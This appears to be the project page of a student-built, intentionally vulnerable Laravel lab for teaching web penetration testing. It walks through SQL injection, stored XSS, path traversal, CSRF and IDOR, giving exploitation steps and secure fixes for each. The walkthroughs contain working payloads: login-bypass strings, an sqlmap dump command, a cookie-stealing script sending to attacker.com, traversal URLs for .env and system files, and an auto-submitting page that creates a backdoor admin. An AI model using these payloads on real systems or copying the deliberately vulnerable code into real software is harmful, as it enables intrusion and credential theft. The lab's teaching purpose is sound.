---
title: "CIU Student Portal — Web Application Security Assessment Lab"
date: "10-07-2026"
tags: ["laravel", "pentesting", "web-security", "vulnerable-lab", "depi", "owasp"]
summary: "An educational, intentionally vulnerable Laravel web application designed for web application penetration testing, vulnerability analysis, and secure code review (DEPI Round 4 Graduation Project)."
---

![DEPI Round 4 - Infrastructure & Security Track](/images/projects/penttest-depi-r4-2026.jpg)

# CIU Student Portal - Web Application Security Assessment Lab

An educational, intentionally vulnerable Laravel web application designed as a controlled laboratory environment for practicing web application penetration testing, vulnerability analysis, and secure code review.

---

## DEPI Graduation Project

This repository represents the final graduation project for the **DEPI (Digital Egypt Pioneers Initiative) - Round 4 - InfraStructure & Security - Vulnerability Analyst and Penetration Tester Track**. 

Conducted by **Group 4**:
- **Mohamed Abdelrahman Mohamed**
- **Mohamed Ramadan Ahmed**
- **Mahmoud Ayman Mohamed**
- **Mohamed Ahmed GalalEldeen**

Under the supervision of **DEPI** instructors, this project demonstrates both manual and automated penetration testing methodologies against a customized educational portal, showcasing how critical vulnerabilities manifest in source code and detailing how to resolve them using professional coding practices.

> [!WARNING]
> **This project contains serious, intentionally exploitable security vulnerabilities.**
> It is designed strictly for local educational and testing purposes. **Do not deploy this application to the internet or any production systems.**

---

## Overview

The **CIU Student Portal** is a mock university portal representing faculty, courses, students, and enrollments. It is designed to expose developers and security analysts to the **OWASP Top 10** vulnerabilities within a modern PHP/Laravel stack. 

### Key Labs & Features
- **Authentication Bypass** — Intentionally vulnerable login logic to practice SQL Injection manual bypasses and automated DB dumping.
- **Stored Script Execution** — Unescaped database rendering templates to observe cookie theft and session hijacking.
- **Directory Traversal** — Direct parameter-to-path concatenation allowing exposure of high-value local files (.env, database files).
- **CSRF Token Exemptions** — Routes explicitly configured to skip CSRF checks, demonstrating session/request hijacking.
- **Vertical & Horizontal Privilege Abuse** — IDOR flaws in profile parameters showing how unauthorized records can be enumerated.
- **One-Command Lab Reset** — Pre-seeded migrations to quickly purge exploit payloads and reset the application state.

---

## Vulnerability Assessment Summary

The security assessment conducted against the portal identified a total of **five (5) vulnerabilities** spanning Critical, High, and Medium ratings. 

| Reference ID | Vulnerability Title | Risk Rating | OWASP Mapping | Primary Mitigation |
| :--- | :--- | :--- | :--- | :--- |
| **`WEB_VUL_01`** | SQL Injection in Authentication Login | **Critical** | A03:2021-Injection | Use Parameterized Queries / Eloquent |
| **`WEB_VUL_02`** | Stored Cross-Site Scripting (XSS) | **High** | A03:2021-Injection | Escape Blade tags (`{{ }}`) |
| **`WEB_VUL_03`** | Path Traversal / Arbitrary File Download | **Critical** | A01:2021-Broken Access Control | Base directory path validation / `basename()` |
| **`WEB_VUL_04`** | Cross-Site Request Forgery (CSRF) | **High** | A01:2021-Broken Access Control | Remove middleware exclusions & add `@csrf` |
| **`WEB_VUL_05`** | Insecure Direct Object Reference (IDOR) | **Medium** | A01:2021-Broken Access Control | Match input ID with authenticated session ID |

---

## Vulnerability Labs Walkthrough

---

### 1. SQL Injection (`WEB_VUL_01`)

- **Risk Rating:** **Critical**
- **OWASP Category:** A03:2021 - Injection
- **Affected File:** `app/Http/Controllers/AuthController.php` (Lines 23-28)
- **Vulnerable Endpoint:** `POST /login`
- **Tools Used:** Browser, Burp Suite, SQLmap

#### Vulnerability Description
The login routine accepts the `email` and `password` parameters directly from the user and concatenates them into a raw SQL query. Because the input is not parameterized or sanitized, an attacker can modify the structure of the SQL command executed by the SQLite database.

```php
// app/Http/Controllers/AuthController.php (Lines 23-28)
$email = $request->input('email');
$password = $request->input('password');
$query = "SELECT * FROM users WHERE email = '$email' AND password = '$password' LIMIT 1";
$users = DB::select($query);
```

#### Penetration Testing & Exploitation Steps
1. **Manual Bypass (No Password Required):**
   - Navigate to `http://127.0.0.1:8000/login`.
   - Enter `admin@ciu.edu' -- ` in the Email field, and enter any dummy value (e.g., `123`) in the Password field.
   - The double dash (`--`) acts as a comment character in SQLite, causing the database to ignore the password condition:
     ```sql
     SELECT * FROM users WHERE email = 'admin@ciu.edu' -- ' AND password = '123' LIMIT 1
     ```
   - Click login. You will bypass authentication and gain immediate access to the **Admin Dashboard**!
2. **General Login Bypass:**
   - Enter `' OR '1'='1' -- ` in the Email field and log in.
3. **Automated DB Extraction using SQLmap:**
   - Run the following terminal command to test the POST parameter:
     ```bash
     sqlmap -u "http://127.0.0.1:8000/login" --method POST --data="email=test@test.com&password=test123" -p email --dbms=sqlite --batch --level=3 --risk=3 --dump
     ```
   - SQLmap will identify that the `email` parameter is injectable, extract all tables, and dump the user database showing names, emails, roles, and plaintext passwords.

#### Countermeasures & Secure Code Fix
Replace the raw concatenated SQL query with Laravel's built-in Eloquent ORM (which uses PDO parameter binding under the hood) or supply bindings to the raw SQL command:

* **Secure Laravel Eloquent Implementation:**
  ```php
  $user = User::where('email', $request->input('email'))
              ->where('password', $request->input('password')) // Note: Passwords should also be hashed in production!
              ->first();
  ```

---

### 2. Stored Cross-Site Scripting (XSS) (`WEB_VUL_02`)

- **Risk Rating:** **High**
- **OWASP Category:** A03:2021 - Injection
- **Affected Files:** 
  - `AdminController.php` (Lines 45-48, 58-60)
  - `dashboard.blade.php` (Lines rendering names)
  - `courses.blade.php` (Student courses rendering names)
- **Vulnerable Endpoints:** `POST /admin/doctors`, `POST /admin/courses`
- **Tools Used:** Browser, OWASP ZAP

#### Vulnerability Description
When adding courses or doctors, the inputs are stored directly in the database without validation. Furthermore, the Blade views render these stored records using Laravel's unescaped `{!! $variable !!}` syntax rather than the standard escaped `{{ $variable }}` syntax. This allows malicious HTML or Javascript payloads to persist in the database and execute in the browser of any user (admin or student) who views the listings.

#### Penetration Testing & Exploitation Steps
1. Log in as an Administrator (`admin@ciu.edu` / `admin123`).
2. Locate the **Add Doctor** form on the Admin Dashboard.
3. In the "Doctor Name" field, enter the following payload:
   ```html
   <script>alert('Stored XSS - Doctor Exploit')</script>
   ```
4. Click **Add Doctor**. The script will immediately execute, displaying a Javascript alert box.
5. In the database, this script tag is stored exactly as entered.
6. Now log in as a student (e.g., `mariam@ciu.edu` / `student123`).
7. When the student navigates to their dashboard or enrollment view where the doctor's name is rendered, the payload will execute automatically in the student's browser. This could allow session hijacking via cookie theft:
   ```html
   <script>new Image().src="http://attacker.com/steal?cookie=" + document.cookie;</script>
   ```

#### Countermeasures & Secure Code Fix
1. **Always Escape View Outputs:**
   Never use unescaped syntax `{!! !!}` unless you explicitly intend to render safe, pre-sanitized HTML. Replace them with standard curly braces `{{ }}` which automatically apply PHP's `htmlspecialchars()`:
   ```diff
   - <td>{!! $doctor->name !!}</td>
   + <td>{{ $doctor->name }}</td>
   ```
2. **Validate Input:** 
   Add request validation constraints in the Controller to reject HTML tags.

---

### 3. Path Traversal / Arbitrary File Download (`WEB_VUL_03`)

- **Risk Rating:** **Critical**
- **OWASP Category:** A01:2021 - Broken Access Control
- **Affected File:** `DownloadController.php` (Lines 11-12)
- **Vulnerable Endpoint:** `GET /download`
- **Tools Used:** Browser, cURL, Burp Suite

#### Vulnerability Description
The `/download` route accepts a `file` parameter and concatenates it directly into the `storage_path()` function to locate and serve files. Because there are no sanitization steps to filter out directory traversal sequences (such as `../`), an attacker can escape the intended storage folder and download any readable file on the system, including the Laravel `.env` file (containing database credentials, application secrets) or even the SQLite database file itself.

```php
// app/Http/Controllers/DownloadController.php (Lines 11-12)
$file = $request->query('file', 'sample.txt');
$path = storage_path('app/' . $file);
```

#### Penetration Testing & Exploitation Steps
1. **Normal Behavior:**
   - Navigating to `http://127.0.0.1:8000/download?file=sample.txt` successfully downloads the default file from `storage/app/sample.txt`.
2. **Exploiting Path Traversal (Laravel Configurations):**
   - Access the URL:
     ```
     http://127.0.0.1:8000/download?file=../../.env
     ```
   - The path resolves to `storage/app/../../.env` which is the project root `.env` configuration file. The file is served, exposing the `APP_KEY`, database configurations, and mail passwords.
3. **Exploiting to Download the Database File:**
   - Access the URL:
     ```
     http://127.0.0.1:8000/download?file=../../database/database.sqlite
     ```
   - This downloads the SQLite binary file. The attacker can open it using a tool like DB Browser for SQLite to read the entire user database, passwords, and student enrollment lists.
4. **OS Level Arbitrary File Retrieval (Windows Environment):**
   - Access the URL:
     ```
     http://127.0.0.1:8000/download?file=../../../../../../Windows/win.ini
     ```
   - This escapes the drive workspace entirely and downloads system-level Windows configuration files.

#### Countermeasures & Secure Code Fix
Strictly sanitize file inputs using `basename()` to strip directory paths, or validate that the resolved path stays inside the target storage directory using `realpath()`:

* **Secure Implementation using Basename:**
  ```php
  // Strips all folder prefixes and only allows filename lookup in storage/app/
  $file = basename($request->query('file', 'sample.txt'));
  $path = storage_path('app/' . $file);
  ```
* **Secure Implementation using Path Validation:**
  ```php
  $file = $request->query('file', 'sample.txt');
  $path = storage_path('app/' . $file);
  $realPath = realpath($path);
  $baseDir = storage_path('app');

  // Verify that the file exists and resolves within the storage/app folder
  if (!$realPath || strpos($realPath, $baseDir) !== 0) {
      abort(403, 'Unauthorized path traversal access.');
  }
  ```

---

### 4. Cross-Site Request Forgery (CSRF) (`WEB_VUL_04`)

- **Risk Rating:** **High**
- **OWASP Category:** A01:2021 - Broken Access Control / Security Misconfiguration
- **Affected Files:**
  - `VerifyCsrfToken.php` (Lines 14-18)
  - `dashboard.blade.php` (Forms missing `@csrf` tags)
- **Vulnerable Endpoints:** `POST /admin/users` and `POST /admin/courses`
- **Tools Used:** Browser, Burp Suite

#### Vulnerability Description
Cross-Site Request Forgery (CSRF) protection is explicitly bypassed for the admin endpoints `/admin/users` and `/admin/courses` by listing them in the `$except` array of the CSRF middleware. As a result, the admin dashboard forms do not generate or expect CSRF validation tokens. An attacker can create a malicious external webpage that, when visited by an authenticated administrator, automatically submits requests to create new admin users or alter courses on the portal.

```php
// app/Http/Middleware/VerifyCsrfToken.php (Lines 14-18)
protected $except = [
    'admin/users',
    'admin/courses',
];
```

#### Penetration Testing & Exploitation Steps
1. Log in as an Administrator at `http://127.0.0.1:8000/login`. Keep your session active.
2. Host the following exploit HTML script (`csrf_poc.html`) on an external local web server:
   ```html
   <html>
     <body>
       <h2>CSRF Exploit: Creating Backdoor Administrator Account</h2>
       <form id="csrfForm" action="http://127.0.0.1:8000/admin/users" method="POST">
         <input type="hidden" name="name" value="Attacker Backdoor" />
         <input type="hidden" name="email" value="backdoor@attacker.com" />
         <input type="hidden" name="password" value="hacker123" />
         <input type="hidden" name="role" value="admin" />
       </form>
       <script>
         // Auto-submit the request on page load
         document.getElementById('csrfForm').submit();
       </script>
     </body>
   </html>
   ```
3. Visit the exploit page in your browser. It will immediately execute a silent POST request to the CIU Student Portal.
4. Return to your Admin Dashboard (`/admin`) and check the user list. A new admin user named `Attacker Backdoor` will be created without your explicit authorization.

#### Countermeasures & Secure Code Fix
1. **Remove Route Exclusions:**
   Remove the routes from the `$except` array in the middleware:
   ```php
   // app/Http/Middleware/VerifyCsrfToken.php
   protected $except = [
       // Remove 'admin/users' and 'admin/courses' to enable protection
   ];
   ```
2. **Add CSRF Directive to Blade Forms:**
   Ensure every POST form contains the `@csrf` directive to generate hidden token fields:
   ```html
   <form method="POST" action="{{ route('admin.storeUser') }}">
       @csrf
       <!-- Form Fields -->
   </form>
   ```

---

### 5. Insecure Direct Object Reference (IDOR) (`WEB_VUL_05`)

- **Risk Rating:** **Medium**
- **OWASP Category:** A01:2021 - Broken Access Control
- **Affected File:** `StudentController.php` (Lines 34-51)
- **Vulnerable Endpoint:** `/enrollments`
- **Tools Used:** Browser, OWASP ZAP Fuzzer

#### Vulnerability Description
The `/enrollments` endpoint accepts a `user_id` parameter as a query string input to filter and display enrollment lists. However, the system does not check if the requesting user's active session is authorized to view that ID. An authenticated student can query any other student's ID (or the admin's ID) to read their course enrollments.

```php
// app/Http/Controllers/StudentController.php (Lines 38-41)
$userId = $request->query('user_id', session('user_id'));
$user = User::findOrFail($userId);
```

#### Penetration Testing & Exploitation Steps
1. Log in as student Mariam (`mariam@ciu.edu` / `student123`).
2. Navigate to your enrollments: `http://127.0.0.1:8000/enrollments?user_id=2`.
3. Change the `user_id` parameter in the URL bar to `1` (Admin) or `3` (Student Omar):
   - `http://127.0.0.1:8000/enrollments?user_id=1` (Views Admin enrollments)
   - `http://127.0.0.1:8000/enrollments?user_id=3` (Views Omar's enrollments)
4. The server responds with `200 OK` and renders their enrollments, exposing private student databases.
5. Using an automated tool (like OWASP ZAP Fuzzer or Intruder), you can fuzz the `user_id` parameter from 1 to 100 to dump the complete student schedules list.

#### Countermeasures & Secure Code Fix
Enforce session checks or apply Laravel Policy/Gate rules to ensure that standard students can only request their own records:

* **Secure Controller Checks:**
  ```php
  public function enrollments(Request $request)
  {
      $this->requireLogin();
      
      $userId = $request->query('user_id', session('user_id'));
      
      // Prevent students from viewing other users' records
      if (session('role') !== 'admin' && session('user_id') != $userId) {
          abort(403, 'Unauthorized access to other student records.');
      }
      
      $user = User::findOrFail($userId);
      // Fetch and return view...
  }
  ```

---

## Seeded Accounts

The seeding process sets up standard accounts to test privileges and exploit vectors:

| Role | Username / Email | Password | Allowed Panel |
| :--- | :--- | :--- | :--- |
| **Administrator** | `admin@ciu.edu` | `admin123` | `/admin` (User, Doctor, & Course Management) |
| **Student** | `mariam@ciu.edu` | `student123` | `/courses` & `/enrollments` |
| **Student** | `omar@ciu.edu` | `student123` | `/courses` & `/enrollments` |
| **Student** | `nour@ciu.edu` | `student123` | `/courses` & `/enrollments` |

---

<div style="margin-top: 32px;">
  <a class="btn" href="https://github.com/ramdn99/PentTest-DEPI-R4-2026" target="_blank" rel="noopener noreferrer">
    GitHub repo.
  </a>
</div>
